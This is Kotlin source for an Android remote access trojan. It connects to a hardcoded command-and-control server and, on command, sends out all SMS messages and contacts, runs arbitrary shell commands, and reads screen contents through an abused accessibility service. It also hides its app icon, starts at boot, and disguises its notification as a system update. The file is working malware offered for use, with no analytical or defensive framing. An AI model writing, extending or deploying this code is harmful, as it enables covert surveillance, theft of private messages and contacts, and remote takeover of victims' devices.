package com.clawd

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Telephony
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.Socket
import java.util.concurrent.Executors
import java.util.concurrent.LinkedBlockingQueue

val SERVER_IP = "178.155.5.234"
val SERVER_PORT = 4444

// Класс MainActivity больше не нужен, так как мы убрали иконку с экрана.
// Оставим его пустым на всякий случай, чтобы не было ошибок компиляции.
class MainActivity : android.app.Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        finish()
    }
}

class C2Client(private val host: String, private val port: Int, private val ctx: Context) {
    private var socket: Socket? = null
    private var out: OutputStreamWriter? = null
    private val io = Executors.newSingleThreadExecutor()
    private val queue = LinkedBlockingQueue<String>(1024)
    @Volatile private var running = false

    fun start() {
        running = true
        io.execute {
            while (running) {
                try {
                    socket = Socket(host, port).apply { soTimeout = 30000 }
                    out = OutputStreamWriter(socket!!.getOutputStream())
                    val reader = BufferedReader(InputStreamReader(socket!!.getInputStream()))
                    send("hello ${Build.MANUFACTURER} ${Build.MODEL} ${Build.VERSION.SDK_INT}")
                    var line: String?
                    while (running && reader.readLine().also { line = it } != null) {
                        handleCommand(line!!.trim())
                    }
                } catch (e: Exception) {
                    Thread.sleep(5000)
                }
            }
        }
        io.execute {
            while (running) {
                try {
                    val msg = queue.take()
                    out?.write(msg + "\n")
                    out?.flush()
                } catch (_: Exception) {}
            }
        }
    }

    fun send(s: String) { if (queue.remainingCapacity() > 0) queue.offer(s) }
    fun stop() { running = false; try { socket?.close() } catch (_: Exception) {}; io.shutdownNow() }

    private fun handleCommand(cmd: String) {
        val parts = cmd.split(" ", limit = 3)
        when (parts[0]) {
            "sms" -> dumpSms(ctx)
            "contacts" -> dumpContacts(ctx)
            "shell" -> shell(parts.getOrElse(1) { "" })
            "back" -> RatAccessibility.instance?.pressBack()
            "home" -> RatAccessibility.instance?.pressHome()
            "dump" -> RatAccessibility.instance?.dumpScreen()
        }
    }
}

class RatAccessibility : AccessibilityService() {
    companion object { @Volatile var instance: RatAccessibility? = null }

    override fun onServiceConnected() {
        instance = this
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
        serviceInfo = info
        // Запускаем C2-клиент сразу, как только включили доступность
        startForegroundService(Intent(this, RatForeground::class.java))
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}

    fun pressBack() { performGlobalAction(GLOBAL_ACTION_BACK) }
    fun pressHome() { performGlobalAction(GLOBAL_ACTION_HOME) }

    fun dumpScreen() {
        val root = rootInActiveWindow ?: return
        val sb = StringBuilder()
        walk(root, sb, 0)
        C2Holder.client?.send("screen\n$sb")
    }

    private fun walk(node: AccessibilityNodeInfo?, sb: StringBuilder, depth: Int) {
        node ?: return
        val pad = "  ".repeat(depth)
        val text = node.text?.toString()?.replace("\n", " ") ?: ""
        if (text.isNotBlank()) sb.append("$pad$text\n")
        for (i in 0 until node.childCount) walk(node.getChild(i), sb, depth + 1)
    }
}

class RatForeground : Service() {
    override fun onCreate() {
        super.onCreate()
        C2Holder.client = C2Client(SERVER_IP, SERVER_PORT, this)
        C2Holder.client?.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val channelId = "rat_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Системная служба")
            .setContentText("Обновление...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
        startForeground(1, notif)
        return START_STICKY
    }

    override fun onBind(intent: Intent?) = null
    override fun onDestroy() { C2Holder.client?.stop() }
}

object C2Holder { @Volatile var client: C2Client? = null }

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            ctx.startForegroundService(Intent(ctx, RatForeground::class.java))
        }
    }
}

fun dumpSms(ctx: Context) {
    val sb = StringBuilder("sms\n")
    val cur = ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, arrayOf("address", "body"), null, null, null)
    cur?.use { while (it.moveToNext()) sb.append("${it.getString(0)}: ${it.getString(1)}\n") }
    C2Holder.client?.send(sb.toString())
}

fun dumpContacts(ctx: Context) {
    val sb = StringBuilder("contacts\n")
    val cur = ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)
    cur?.use { while (it.moveToNext()) sb.append("${it.getString(0)}: ${it.getString(1)}\n") }
    C2Holder.client?.send(sb.toString())
}

fun shell(cmd: String) {
    val sb = StringBuilder()
    try {
        val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
        BufferedReader(InputStreamReader(p.inputStream)).useLines { lines -> lines.forEach { sb.append(it).append("\n") } }
        p.waitFor()
    } catch (e: Exception) { sb.append("err $e") }
    C2Holder.client?.send("shell\n$sb")
}
